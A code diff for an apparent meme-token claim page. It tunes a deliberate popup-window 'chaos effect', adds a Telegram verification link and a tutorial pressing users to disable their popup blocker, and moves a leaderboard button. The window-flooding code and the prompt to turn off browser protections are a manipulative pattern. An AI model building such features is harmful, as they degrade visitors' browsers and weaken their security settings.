@@ -29,6 +29,7 @@ if (isMobileDevice()) {
     const leaderboardWindow = document.getElementById('leaderboardWindow');
     const closeLeaderboardButton = document.getElementById('closeLeaderboardButton');
     const leaderboardList = document.getElementById('leaderboardList');
+    const navTabs = document.querySelector('.nav-tabs');
 
     // Variables to manage chaos
 
@@ -43,16 +44,16 @@ if (isMobileDevice()) {
 
     // You can adjust the following variables to control the chaos levels:
 
-    const initialSpawnMultiplier = 4;    // Initial number of windows to spawn at once
-    const spawnIntervalTime = 500;      // Initial interval between spawns (in milliseconds)
+    const initialSpawnMultiplier = 2;    // Initial number of windows to spawn at once
+    const spawnIntervalTime = 1000;      // Initial interval between spawns (in milliseconds)
     const spawnMultiplierIncrement = 1;  // How much to increase the spawn multiplier each time
     const spawnIntervalDecrement = 100;  // How much to decrease the spawn interval each time
-    const minSpawnIntervalTime = 100;    // Minimum spawn interval (in milliseconds)
-    const spawnIncreaseInterval = 5000; // Time between increasing chaos (in milliseconds)
-    const maxSpawnMultiplier = 100;       // Maximum number of windows to spawn at once
+    const minSpawnIntervalTime = 200;    // Minimum spawn interval (in milliseconds)
+    const spawnIncreaseInterval = 10000; // Time between increasing chaos (in milliseconds)
+    const maxSpawnMultiplier = 10;       // Maximum number of windows to spawn at once
 
-    const initialSnakeWindowsCount = 4;  // Initial number of snake windows
-    const maxSnakeWindowsCount = 50;      // Maximum number of snake windows
+    const initialSnakeWindowsCount = 2;  // Initial number of snake windows
+    const maxSnakeWindowsCount = 5;      // Maximum number of snake windows
     const snakeWindowChance = 0.3;       // Chance that a new window becomes a snake window (0 to 1)
 
     const chaosWindowMoveInterval = 200; // Interval for moving chaos windows (in milliseconds)
@@ -176,9 +177,9 @@ if (isMobileDevice()) {
                 // Show the second CLAIM button
                 secondClaimButtonContainer.style.display = 'block';
             } else {
-                // Display instructions and link to verification bot
+                // Display instructions and link to verification bot with /verify pre-typed
                 displayModalMessage(
-                    `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot" target="_blank">@DoublePenisVerifyBot</a>`,
+                    `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot?start=verify" target="_blank">@DoublePenisVerifyBot</a>`,
                     'error'
                 );
             }
@@ -209,45 +210,45 @@ if (isMobileDevice()) {
         const testWindow = window.open('', '', 'width=200,height=100');
         if (testWindow === null || typeof testWindow === 'undefined') {
             alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+
+            // Show tutorial video on how to disable popup blocker
+            showPopupBlockerTutorial();
+
             claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
             return;
         } else {
-            // Write "Verifying..." in the test window
-            testWindow.document.write(`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <title>Verifying...</title>
-                    <style>
-                        body {
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            height: 100%;
-                            margin: 0;
-                            font-family: Arial, sans-serif;
-                            background-color: #ffffff;
-                        }
-                        h1 {
-                            font-size: 20px;
-                            color: #000000;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h1>Verifying...</h1>
-                </body>
-                </html>
-            `);
+            // Close the test window immediately
+            testWindow.close();
 
-            // Close the test window after 1 second
-            setTimeout(() => {
-                testWindow.close();
-                // Start Chaos Effect
-                startChaos();
-            }, 1000);
+            // Start Chaos Effect
+            startChaos();
         }
     });
+
+    // Function to show popup blocker tutorial
+    function showPopupBlockerTutorial() {
+        const tutorialModal = document.createElement('div');
+        tutorialModal.classList.add('modal');
+        tutorialModal.id = 'tutorialModal';
+        tutorialModal.innerHTML = `
+            <div class="modal-content">
+                <span class="close" id="closeTutorial">&times;</span>
+                <h2>How to Disable Popup Blocker</h2>
+                <video width="100%" controls>
+                    <source src="tutorial1.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+        `;
+        document.body.appendChild(tutorialModal);
+
+        const closeTutorial = document.getElementById('closeTutorial');
+        closeTutorial.addEventListener('click', () => {
+            tutorialModal.remove();
+        });
+
+        tutorialModal.style.display = 'block';
+    }
 
     // Send Referral Messages
     async function sendReferralMessages() {
@@ -404,6 +405,10 @@ if (isMobileDevice()) {
         } else {
             console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
             alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+
+            // Show tutorial video on how to disable popup blocker
+            showPopupBlockerTutorial();
+
             stopChaos(); // Stop attempting to spawn windows
         }
     }
@@ -541,4 +546,32 @@ if (isMobileDevice()) {
             leaderboardList.innerHTML = '<li>Error fetching leaderboard.</li>';
         }
     }
+
+    // Move Leaderboard Button to Nav Bar
+    function moveLeaderboardButtonToNavBar() {
+        // Remove existing leaderboard button
+        leaderboardButton.parentNode.removeChild(leaderboardButton);
+
+        // Create a new tab for the leaderboard
+        const leaderboardTab = document.createElement('div');
+        leaderboardTab.classList.add('tab');
+        leaderboardTab.id = 'leaderboardButton';
+        leaderboardTab.textContent = 'Leaderboard';
+
+        // Append it to the nav tabs
+        navTabs.appendChild(leaderboardTab);
+
+        // Re-attach event listener
+        leaderboardTab.addEventListener('click', () => {
+            if (leaderboardWindow.style.display === 'none' || leaderboardWindow.style.display === '') {
+                leaderboardWindow.style.display = 'block';
+                fetchLeaderboard();
+            } else {
+                leaderboardWindow.style.display = 'none';
+            }
+        });
+    }
+
+    // Call the function to move the leaderboard button
+    moveLeaderboardButtonToNavBar();
 }
